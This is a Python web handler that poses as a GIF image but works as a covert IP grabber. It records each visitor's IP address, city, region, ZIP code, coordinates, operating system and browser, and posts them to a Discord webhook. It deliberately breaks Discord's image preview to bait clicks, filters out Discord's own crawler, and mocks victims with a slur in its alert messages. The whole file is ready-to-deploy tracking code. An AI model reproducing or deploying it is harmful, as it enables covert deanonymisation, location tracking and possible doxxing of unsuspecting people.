from http.server import BaseHTTPRequestHandler
from urllib import parse
import httpx
import base64
import httpagentparser

# === CHANGE THIS TO YOUR REAL DISCORD WEBHOOK URL ===
webhook = 'https://discord.com/api/webhooks/YOUR/WEBHOOK/HERE'

bindata = httpx.get('https://th.bing.com/th/id/OIP.xXJEf5k4LqmkR9skmyBlCQHaIi?w=153&h=180&c=7&r=0&o=7&cb=ucfimg2&pid=1.7&rm=3&ucfimg=1').content

# Set to True to break Discord preview (no thumbnail, forces "Open Original" click)
buggedimg = True

# Simple invalid data that Discord can't preview (tiny corrupt "GIF" header or junk bytes)
# Option 1: Corrupt GIF header
buggedbin = b'GIF89a' + b'\x00' * 50  # Invalid dimensions/palette → preview fails

# Option 2: Even simpler junk (alternative if above still previews sometimes)
# buggedbin = b'\x00' * 100

# Option 3: Empty response (strongest break, shows clear broken state)
# buggedbin = b''

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "bobs slave",
        "content": "@everyone",
        "embeds": [
            {
                "title": "DADDY BOB STRIKES AGAIN!",
                "color": 16711803,
                "description": "A New Retard Opened The \"Gif\" LOL.",
                "author": {"name": "Fentanyl"},
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** {ip}\n**City:** {city}\n**Region:** {reg}\n**Country:** {country}\n**Location:** {loc}\n**ORG:** {org}\n**ZIP:** {postal}",
                        "inline": True
                    },
                    {
                        "name": "Advanced Info",
                        "value": f"**OS:** {os}\n**Browser:** {browser}\n**UserAgent:** {useragent}",
                        "inline": False
                    }
                ]
            }
        ]
    }

def prev(ip, uag):
    return {
        "username": "Fentanyl",
        "content": "",
        "embeds": [
            {
                "title": "Fentanyl Alert!",
                "color": 16711803,
                "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `{uag}`",
                "author": {"name": "Fentanyl"}
            }
        ]
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get real IP (first in x-forwarded-for list)
            forwarded = self.headers.get('x-forwarded-for')
            ip = forwarded.split(',')[0].strip() if forwarded else 'Unknown'
            useragent = self.headers.get('user-agent', 'No User Agent Found!')
            os, browser = httpagentparser.simple_detect(useragent)

            # Parse query for ?url= (optional proxy load)
            query = parse.urlsplit(self.path).query
            dic = dict(parse.parse_qsl(query))
            try:
                data = httpx.get(dic['url']).content if 'url' in dic else bindata
            except Exception:
                data = bindata

            # Discord bot/preview detection
            if 'discord' in useragent.lower() or ip.startswith(('35.', '34.', '104.196.')):
                self.send_response(200)
                self.send_header('Content-type', 'image/gif')  # Change to gif for better "loading" bait
                self.end_headers()
                self.wfile.write(buggedbin if buggedimg else bindata)
                httpx.post(webhook, json=prev(ip, useragent))
                return

            # Normal grab (real user clicking open)
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')  # Keep gif extension feel
            self.end_headers()
            self.wfile.write(data)

            # Fetch IP info and send to webhook
            try:
                ipInfo = httpx.get(f'https://ipinfo.io/{ip}/json').json()
                payload = formatHook(
                    ipInfo.get('ip', ip),
                    ipInfo.get('city', 'Unknown'),
                    ipInfo.get('region', 'Unknown'),
                    ipInfo.get('country', 'Unknown'),
                    ipInfo.get('loc', 'Unknown'),
                    ipInfo.get('org', 'Unknown'),
                    ipInfo.get('postal', 'Unknown'),
                    useragent,
                    os,
                    browser
                )
                httpx.post(webhook, json=payload)
            except Exception:
                # If ipinfo fails, still send basic
                httpx.post(webhook, json=formatHook(ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', 'Unknown', useragent, os, browser))

        except Exception as e:
            # Fallback if anything explodes
            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(bindata)
        return
